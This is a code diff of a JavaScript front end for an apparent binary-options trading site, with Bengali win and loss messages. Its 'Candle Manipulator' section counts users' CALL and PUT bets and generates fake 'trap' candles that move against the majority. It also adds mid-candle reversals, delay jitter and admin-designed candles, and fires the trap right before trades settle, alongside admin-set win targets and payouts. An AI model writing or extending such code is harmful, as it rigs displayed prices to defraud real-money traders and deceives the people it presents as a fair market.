+      " | Result: " + realResult.toUpperCase() +
+      " | WinTarget: " + winPercent + "%"
+    );
+
+    var payoutRate = ((typeof adminPayout !== "undefined" ? adminPayout : 96) / 100) + 1;
+    var netProfit = realResult === "win" ? trade.amount * (payoutRate - 1) : 0;
+    var returnAmount = realResult === "win" ? trade.amount + netProfit : 0;
+
+    try {
+      await updateDoc(doc(db, "trades", trade.id), {
+        status: "completed",
+        result: realResult,
+        exitPrice: exitPrice,
+        profit: returnAmount,
+        netProfit: netProfit,
+        completedAt: new Date().toISOString(),
+        adminProcessed: true
+      });
+
+      if (realResult === "win") {
+        var userRef = doc(db, "users", currentUser.uid);
+        var userDoc = await getDoc(userRef);
+        if (userDoc.exists()) {
+          var userData = userDoc.data();
+          var balanceField = accountType === "demo" ? "demoBalance" : "realBalance";
+          var curBal = userData[balanceField] || 0;
+          var newBal = curBal + returnAmount;
+
+          await updateDoc(userRef, {
+            [balanceField]: newBal,
+            balance: newBal
+          });
+
+          userBalance = newBal;
+          window.userBalance = newBal;
+
+          if (balanceEl) balanceEl.textContent = newBal.toFixed(2);
+          if (balancePopupValue) balancePopupValue.textContent = newBal.toFixed(2);
+
+          if (typeof animateBalanceChange === "function") animateBalanceChange(returnAmount);
+          if (typeof showResultFlash === "function") showResultFlash("win");
+          if (typeof playSound === "function") playSound("win");
+
+          if (tradeMessage) {
+            tradeMessage.style.color = "#00c853";
+            tradeMessage.textContent = "🎉 জিতেছেন! +$" + netProfit.toFixed(2);
+            setTimeout(function() { tradeMessage.textContent = ""; }, 3500);
+          }
+        }
+      } else {
+        if (typeof showResultFlash === "function") showResultFlash("loss");
+        if (typeof playSound === "function") playSound("loss");
+
+        if (tradeMessage) {
+          tradeMessage.style.color = "#ff5252";
+          tradeMessage.textContent = "😔 হেরেছেন -$" + trade.amount.toFixed(2);
+          setTimeout(function() { tradeMessage.textContent = ""; }, 3500);
+        }
+      }
+    } catch (err) {
+      console.error("[Trade Process V2 Error]", err.message);
+    }
+  }
+}
+
+// Override the old processTradeResults
+window.processTradeResults = processTradeResultsV2;
+
+// ============================================================
+// 8. INIT
+// ============================================================
+
 setTimeout(function() {
   startLiveMovement();
   startAutoCandleGeneration();
@@ -1795,11 +3216,22 @@ setTimeout(function() {
   console.log("[MSG11] All systems started");
 }, 4000);
 
-console.log("Part 3: MSG 10 (True Trade) + MSG 11 (Live Movement + Analysis) loaded");
+// Expose for debugging
+window.startLiveMovement = startLiveMovement;
+window.startAutoCandleGeneration = startAutoCandleGeneration;
+window.analyzeActiveTrades = analyzeActiveTrades;
+window.processTradeResultsV2 = processTradeResultsV2;
+window.tradeAnalysis = window.tradeAnalysis;
 
-// ============================================
-// MSG 12: CANDLE MANIPULATOR + TRAP + DELAY + REVERSAL
-// ============================================
+console.log("===== MSG 11: Live Movement + Auto Candle + Multi-user Analysis loaded =====");
+
+/* ============================================================
+   MSG 12: CANDLE MANIPULATOR + TRAP + DELAY + REVERSAL
+   ============================================================ */
+
+// ============================================================
+// 1. STATE VARIABLES
+// ============================================================
 
 window.trapEngine = {
   trapRate: 30,
@@ -1809,6 +3241,10 @@ window.trapEngine = {
   candleOpenPrice: {},
   candlePhases: {}
 };
+
+// ============================================================
+// 2. LISTEN TRAP SETTINGS
+// ============================================================
 
 function listenTrapSettings() {
   if (typeof db === "undefined") return;
@@ -1834,31 +3270,46 @@ function listenTrapSettings() {
 
 setTimeout(listenTrapSettings, 3000);
 
-// Decision logic
+// ============================================================
+// 3. TRAP DECISION LOGIC
+// ============================================================
+
+// Decide if current candle should be trapped
 function shouldTrap() {
   var rate = window.trapEngine.trapRate || 0;
-  return (Math.random() * 100) < rate;
+  var r = Math.random() * 100;
+  return r < rate;
 }
 
+// Decide if delay should be injected
 function shouldDelay() {
   var rate = window.trapEngine.delayRate || 0;
-  return (Math.random() * 100) < rate;
+  var r = Math.random() * 100;
+  return r < rate;
 }
 
+// Decide if mid-reversal should happen
 function shouldReversal() {
   var rate = window.trapEngine.reversalRate || 0;
-  return (Math.random() * 100) < rate;
+  var r = Math.random() * 100;
+  return r < rate;
 }
 
-// Generate trap candle
+// ============================================================
+// 4. TRAP CANDLE GENERATOR
+// ============================================================
+
+// Generate a trap candle: open green → close red (or vice versa)
 function generateTrapCandle(direction) {
   var openPrice = currentPrice;
   var trapSize = 50 + Math.random() * 100;
   var closePrice;
 
   if (direction === "trap_down") {
+    // Looks like up movement, then closes down
     closePrice = openPrice - trapSize;
   } else if (direction === "trap_up") {
+    // Looks like down movement, then closes up
     closePrice = openPrice + trapSize;
   } else {
     closePrice = openPrice + (Math.random() - 0.5) * 100;
@@ -1867,10 +3318,11 @@ function generateTrapCandle(direction) {
   var high = Math.max(openPrice, closePrice) + Math.random() * 30;
   var low = Math.min(openPrice, closePrice) - Math.random() * 30;
 
+  // Trap: candle looks opposite first, then reverses
   if (direction === "trap_down") {
-    high = openPrice + Math.random() * 80;
+    high = openPrice + Math.random() * 80; // looks up
   } else if (direction === "trap_up") {
-    low = openPrice - Math.random() * 80;
+    low = openPrice - Math.random() * 80; // looks down
   }
 
   return {
@@ -1882,7 +3334,10 @@ function generateTrapCandle(direction) {
   };
 }
 
-// Apply trap from analysis
+// ============================================================
+// 5. APPLY TRAP BASED ON ANALYSIS
+// ============================================================
+
 function applyTrapFromAnalysis() {
   if (typeof candleSeries === "undefined" || !candleSeries) return;
   if (!window.tradeAnalysis) return;
@@ -1891,11 +3346,16 @@ function applyTrapFromAnalysis() {
   var analysis = window.tradeAnalysis;
   var direction = analysis.suggestedDirection;
 
+  // Only trap if should
   if (!shouldTrap()) return;
 
-  var trapDir = "trap_down";
-  if (direction === "up") trapDir = "trap_up";
+  // Determine trap direction
+  var trapDir = "trap_down"; // Default: CALL-heavy → candle goes down
+  if (direction === "up") {
+    trapDir = "trap_up"; // PUT-heavy → candle goes up
+  }
 
+  // Get current candle time
   var now = Math.floor(Date.now() / 1000);
   var candleTime = Math.floor(now / 60) * 60;
 
@@ -1916,20 +3376,29 @@ function applyTrapFromAnalysis() {
     console.log(
       "[MSG12] TRAP applied: " + trapDir.toUpperCase() +
       " | Open: " + trapCandle.open.toFixed(2) +
-      " → Close: " + trapCandle.close.toFixed(2)
+      " → Close: " + trapCandle.close.toFixed(2) +
+      " | For: " + analysis.callCount + " CALL, " + analysis.putCount + " PUT users"
     );
   } catch(err) {
     console.error("[MSG12] Trap apply error:", err.message);
   }
 }
 
-// Delay injector
+// ============================================================
+// 6. DELAY INJECTOR — Random delays in candle close
+// ============================================================
+
+window.delayTimer = null;
+
 function injectDelay() {
   if (!shouldDelay()) return;
 
+  // Random delay: 1-5 seconds
   var delaySec = 1 + Math.floor(Math.random() * 4);
+
   console.log("[MSG12] DELAY injected: " + delaySec + "s");
 
+  // Small visual jitter (not real close delay, just visual)
   var jitter = (Math.random() - 0.5) * 20;
   currentPrice = currentPrice + jitter;
   window.currentPrice = currentPrice;
@@ -1941,7 +3410,10 @@ function injectDelay() {
 
 setInterval(injectDelay, 5000);
 
-// Mid-candle reversal
+// ============================================================
+// 7. MID-CANDLE REVERSAL
+// ============================================================
+
 function applyMidReversal() {
   if (!shouldReversal()) return;
   if (typeof candleSeries === "undefined" || !candleSeries) return;
@@ -1949,24 +3421,29 @@ function applyMidReversal() {
   var now = Math.floor(Date.now() / 1000);
   var candleTime = Math.floor(now / 60) * 60;
 
+  // Current close vs open
   var openP = window.currentCandleOpen || currentPrice;
   var closeP = currentPrice;
 
+  // If candle currently going up (green), reverse to red
   if (closeP > openP) {
     var reverseClose = openP - Math.random() * 50;
     try {
       candleSeries.update({
         time: candleTime,
         open: openP,
-        high: closeP + Math.random() * 20,
+        high: closeP + Math.random() * 20, // peak was higher
         low: reverseClose - Math.random() * 10,
         close: reverseClose
       });
       currentPrice = reverseClose;
       window.currentPrice = reverseClose;
-      console.log("[MSG12] MID-REVERSAL: Green → Red");
+
+      console.log("[MSG12] MID-REVERSAL: Green → Red | Peak: " + closeP.toFixed(2) + " → Close: " + reverseClose.toFixed(2));
     } catch(err) {}
-  } else if (closeP < openP) {
+  }
+  // If going down, reverse to green
+  else if (closeP < openP) {
     var reverseClose2 = openP + Math.random() * 50;
     try {
       candleSeries.update({
@@ -1978,30 +3455,78 @@ function applyMidReversal() {
       });
       currentPrice = reverseClose2;
       window.currentPrice = reverseClose2;
-      console.log("[MSG12] MID-REVERSAL: Red → Green");
+
+      console.log("[MSG12] MID-REVERSAL: Red → Green | Bottom: " + closeP.toFixed(2) + " → Close: " + reverseClose2.toFixed(2));
     } catch(err) {}
   }
 }
 
 setInterval(applyMidReversal, 30000);
 
-// Trap check every 5 seconds when trades active
+// ============================================================
+// 8. INTEGRATE WITH ANALYZER
+// ============================================================
+
+// Run trap check every 5 seconds when trades are active
 setInterval(function() {
   if (!window.currentUser) return;
   if (!window.tradeAnalysis) return;
   if (window.tradeAnalysis.callCount + window.tradeAnalysis.putCount === 0) return;
+
   applyTrapFromAnalysis();
 }, 5000);
 
-// ============================================
-// MSG 13: AUTO 24/7 GENERATION + DESIGNER APPLY
-// ============================================
+// ============================================================
+// 9. APPLY TRAP BEFORE TRADE RESULT
+// ============================================================
+
+// Override processTradeResultsV2 to apply trap right before completion
+var _origProcessTradeResults = window.processTradeResults;
+
+window.processTradeResults = async function() {
+  // Before processing, apply trap if there are active trades
+  if (window.tradeAnalysis &&
+      window.tradeAnalysis.callCount + window.tradeAnalysis.putCount > 0) {
+    applyTrapFromAnalysis();
+  }
+
+  // Then call original
+  if (typeof _origProcessTradeResults === "function") {
+    return _origProcessTradeResults();
+  }
+};
+
+// ============================================================
+// 10. EXPOSE FOR DEBUG
+// ============================================================
+
+window.applyTrapFromAnalysis = applyTrapFromAnalysis;
+window.shouldTrap = shouldTrap;
+window.shouldDelay = shouldDelay;
+window.shouldReversal = shouldReversal;
+window.injectDelay = injectDelay;
+window.applyMidReversal = applyMidReversal;
+window.generateTrapCandle = generateTrapCandle;
+
+console.log("===== MSG 12: Candle Manipulator + Trap + Delay + Reversal loaded =====");
+
+/* ============================================================
+   MSG 13: AUTO 24/7 GENERATION + DESIGNER APPLY
+   ============================================================ */
+
+// ============================================================
+// 1. STATE VARIABLES
+// ============================================================
 
 window.autoGenerate24h = false;
 window.designerCandle = null;
 window.applyNextAt = 0;
 window.auto24hInterval = null;
 window.designerListeners = {};
+
+// ============================================================
+// 2. LISTEN AUTO 24/7 + DESIGNER
+// ============================================================
 
 function listenAuto24hSettings() {
   if (typeof db === "undefined") return;
@@ -2025,6 +3550,7 @@ function listenDesignerForMarket(marketId) {
   if (!marketId) return;
   if (typeof db === "undefined") return;
 
+  // Unsubscribe previous
   if (window.designerListeners[marketId]) {
     try { window.designerListeners[marketId](); } catch(e) {}
   }
@@ -2048,7 +3574,10 @@ function listenDesignerForMarket(marketId) {
   }
 }
 
-// Auto 24/7 generation engine
+// ============================================================
+// 3. AUTO 24/7 GENERATION ENGINE
+// ============================================================
+
 function startAuto24hGeneration() {
   if (window.auto24hInterval) clearInterval(window.auto24hInterval);
 
@@ -2057,25 +3586,31 @@ function startAuto24hGeneration() {
     if (typeof candleSeries === "undefined" || !candleSeries) return;
     if (!window.selectedMarketId) return;
 
+    // Generate a new candle
     var now = Math.floor(Date.now() / 1000);
     var candleTime = Math.floor(now / 60) * 60;
 
+    // Only generate if new minute
     if (window.currentCandleTime === candleTime) return;
 
+    // Check if designer applies
     var designerData = window.designerCandle;
     var useDesigner = designerData &&
                       window.applyNextAt > 0 &&
-                      (Date.now() - window.applyNextAt < 70000);
+                      (Date.now() - window.applyNextAt < 70000); // within 70s
 
     var openP, closeP, highP, lowP;
 
     if (useDesigner) {
+      // Use designer values
       openP = designerData.open;
       closeP = designerData.close;
       highP = designerData.high;
       lowP = designerData.low;
+
       console.log("[MSG13] Applying designer candle:", designerData);
     } else {
+      // Natural generation
       openP = currentPrice;
       var move = (Math.random() - 0.5) * 120;
       closeP = openP + move;
@@ -2097,6 +3632,7 @@ function startAuto24hGeneration() {
       window.currentCandleTime = candleTime;
       window.currentCandleOpen = closeP;
 
+      // Save to Firestore (persist)
       if (window.selectedMarketId) {
         var cid = 'auto_' + candleTime;
         try {
@@ -2120,38 +3656,50 @@ function startAuto24hGeneration() {
 
       console.log("[MSG13] Auto 24/7 candle generated: " + openP.toFixed(2) + " → " + closeP.toFixed(2) + (useDesigner ? " [DESIGNER]" : ""));
 
+      // Clear designer after apply
       if (useDesigner) {
         window.applyNextAt = 0;
       }
     } catch(err) {
       console.error("[MSG13] Auto 24/7 error:", err.message);
     }
-  }, 10000);
+  }, 10000); // Check every 10s, generate on new minute
 
   console.log("[MSG13] Auto 24/7 generation engine started");
 }
 
-// Auto-start MSG 13
+// ============================================================
+// 4. AUTO-START
+// ============================================================
+
 setTimeout(function() {
   startAuto24hGeneration();
+
+  // Also start designer listener for current market
   if (window.selectedMarketId) {
     listenDesignerForMarket(window.selectedMarketId);
   }
 }, 5000);
 
+// Listen for market change → update designer listener
 setInterval(function() {
   if (window.selectedMarketId && !window.designerListeners[window.selectedMarketId]) {
     listenDesignerForMarket(window.selectedMarketId);
   }
 }, 5000);
 
-console.log("Part 4: MSG 12 (Candle Manipulator) + MSG 13 (Auto 24/7 + Designer) loaded");
+// ============================================================
+// 5. EXPOSE FOR DEBUG
+// ============================================================
 
-console.log("Part 2: Chart + Drawing + Trade System loaded");
+window.startAuto24hGeneration = startAuto24hGeneration;
+window.listenDesignerForMarket = listenDesignerForMarket;
 
-// ============================================
-// MSG 14: USER CHAT SYSTEM
-// ============================================
+console.log("===== MSG 13: Auto 24/7 Generation + Designer Apply loaded =====");
+
+/* ============================================================
+   MSG 14: User Chat System
+   ============================================================ */
 
 window.userChatUnsub = null;
 
@@ -2167,6 +3715,7 @@ function openUserChat() {
   popup.classList.remove("hidden");
   if (overlay) overlay.onclick = function() { closeUserChat(); };
 
+  // Start listening to messages
   startUserChatListener();
 }
 
@@ -2248,6 +3797,7 @@ async function sendUserChatMessage() {
       text: text,
       timestamp: new Date().toISOString()
     });
+
     console.log("[MSG14-User] Message sent to admin");
   } catch (err) {
     console.error("[MSG14-User] Send error:", err.message);
@@ -2259,10 +3809,10 @@ async function sendUserChatMessage() {
 // ============================================================
 
 setTimeout(function() {
-  var chatBtnEl = document.getElementById("chat-btn");
-  if (chatBtnEl && chatBtnEl.dataset.bound !== "1") {
-    chatBtnEl.dataset.bound = "1";
-    chatBtnEl.onclick = openUserChat;
+  var chatBtn = document.getElementById("chat-btn");
+  if (chatBtn && chatBtn.dataset.bound !== "1") {
+    chatBtn.dataset.bound = "1";
+    chatBtn.onclick = openUserChat;
     console.log("[MSG14-User] Chat button bound");
   }
 
@@ -2291,76 +3841,86 @@ setTimeout(function() {
   }
 }, 3000);
 
-// ============================================
-// GLOBAL EXPOSE (Debug + Cross-module)
-// ============================================
+console.log("===== MSG 14: Admin Chat + User Chat loaded =====");
+/* ============================================================
+   GLOBAL EXPOSE (Debug + Cross-module access)
+   ============================================================ */
 
-// Expose Auth state
+// Expose Auth state (module -> window)
 setInterval(function() {
-  if (typeof currentUser !== "undefined" && currentUser) {
-    window.currentUser = currentUser;
-  }
-  if (typeof userBalance !== "undefined") {
-    window.userBalance = userBalance;
-  }
-  if (typeof selectedAsset !== "undefined") {
-    window.selectedAsset = selectedAsset;
-  }
-  if (typeof accountType !== "undefined") {
-    window.accountType = accountType;
-  }
+  window.currentUser = currentUser;
+  window.userBalance = userBalance;
+  window.selectedAsset = selectedAsset;
+  window.accountType = accountType;
 }, 1000);
 
-// Expose core functions
-window.placeTrade = placeTrade;
-window.processTradeResults = processTradeResults;
-window.loadActiveTrades = loadActiveTrades;
-window.loadHistory = loadHistory;
-window.initChart = initChart;
+// Expose Part 7A functions
+window.loadUserMarketsFromFirestore = loadUserMarketsFromFirestore;
+window.populateAssetSelect = populateAssetSelect;
+window.listenUserMarkets = listenUserMarkets;
+window.bindMarketChangeHandler = bindMarketChangeHandler;
+window.initUserMarkets = initUserMarkets;
+window.updatePayoutLabelsFromMarket = updatePayoutLabelsFromMarket;
+
+// Expose Part 7B functions
+window.loadAdminCandlesFromFirestore = loadAdminCandlesFromFirestore;
+window.convertAdminCandleToChart = convertAdminCandleToChart;
+window.renderAdminCandlesOnChart = renderAdminCandlesOnChart;
+window.listenAdminCandles = listenAdminCandles;
+window.loadUserCandlesSmart = loadUserCandlesSmart;
+window.onMarketChanged = onMarketChanged;
+
+// Expose core functions (for testing)
 window.loadCandles = loadCandles;
 window.startLivePrice = startLivePrice;
 window.stopLivePrice = stopLivePrice;
-window.updateBigTimer = updateBigTimer;
-window.animateBalanceChange = animateBalanceChange;
-window.showResultFlash = showResultFlash;
-window.playSound = playSound;
-window.updateTopCountdown = updateTopCountdown;
-window.renderTradeMarkers = renderTradeMarkers;
-window.startLiveMovement = startLiveMovement;
-window.startAutoCandleGeneration = startAutoCandleGeneration;
-window.analyzeActiveTrades = analyzeActiveTrades;
-window.applyTrapFromAnalysis = applyTrapFromAnalysis;
-window.startAuto24hGeneration = startAuto24hGeneration;
-window.listenDesignerForMarket = listenDesignerForMarket;
-window.openUserChat = openUserChat;
-window.closeUserChat = closeUserChat;
-window.sendUserChatMessage = sendUserChatMessage;
+window.placeTrade = placeTrade;
+window.checkExpiredTrades = checkExpiredTrades;
+window.checkExpiredTradesAdmin = checkExpiredTradesAdmin;
+window.listenAdminSettings = listenAdminSettings;
+window.updatePayoutLabels = updatePayoutLabels;
+window.applyMarketForce = applyMarketForce;
+window.startAutoModeDrift = startAutoModeDrift;
 
-// Expose state variables
+// Expose chart state
 setInterval(function() {
-  if (typeof chart !== "undefined" && chart) window.chart = chart;
-  if (typeof candleSeries !== "undefined" && candleSeries) window.candleSeries = candleSeries;
-  if (typeof activeTradesLocal !== "undefined" && Array.isArray(activeTradesLocal)) {
-    window.activeTradesLocal = activeTradesLocal;
-  }
-  if (typeof currentPrice !== "undefined") window.currentPrice = currentPrice;
+  window.chart = chart;
+  window.candleSeries = candleSeries;
 }, 500);
 
-// Expose Firebase
-window.db = db;
-window.auth = auth;
-window.getDocs = getDocs;
-window.collection = collection;
-window.doc = doc;
-window.setDoc = setDoc;
-window.updateDoc = updateDoc;
-window.query = query;
-window.where = where;
-window.onSnapshot = onSnapshot;
-window.addDoc = addDoc;
-window.getDoc = getDoc;
-window.orderBy = orderBy;
+console.log("✅ All Part 7A + 7B functions exposed to window");
+console.log("✅ Auth state synced (window.currentUser)");
+console.log("📊 যা এখন কাজ করবে:");
+console.log("   1. Win Rate — Admin থেকে সেট → ট্রেডে প্রয়োগ");
+console.log("   2. Payout % — Admin থেকে সেট → জিতলে সেই %");
+console.log("   3. Market Force — Admin ⬆⬇ → প্রাইস উপরে-নিচে");
+console.log("   4. Auto Mode — Admin Toggle → অটো drift");
 
-console.log("Part 5: MSG 14 (User Chat) + Global Expose loaded");
-console.log("===== APP.JS REBUILD COMPLETE =====");
-console.log("User Site Only — All features: Part 1-5 + 7A + 7B + MSG 10-14");
+// === FINAL EXPOSE ===
+window.placeTrade = placeTrade;
+window.checkExpiredTrades = checkExpiredTrades;
+window.checkExpiredTradesAdmin = checkExpiredTradesAdmin;
+window.updateTradeMarkers = updateTradeMarkers;
+window.loadActiveTrades = loadActiveTrades;
+
+// === FINAL STATE SYNC ===
+setInterval(function() {
+  if (typeof currentUser !== 'undefined' && currentUser) {
+    window.currentUser = currentUser;
+    window.userBalance = userBalance;
+  }
+  if (typeof chart !== 'undefined' && chart) {
+    window.chart = chart;
+  }
+  if (typeof candleSeries !== 'undefined' && candleSeries) {
+    window.candleSeries = candleSeries;
+  }
+  if (typeof activeTradesLocal !== 'undefined') {
+    window.activeTradesLocal = activeTradesLocal;
+  }
+  if (typeof currentPrice !== 'undefined') {
+    window.currentPrice = currentPrice;
+  }
+}, 500);
+
+console.log("✅ APP.JS FINAL EXPOSE COMPLETE");
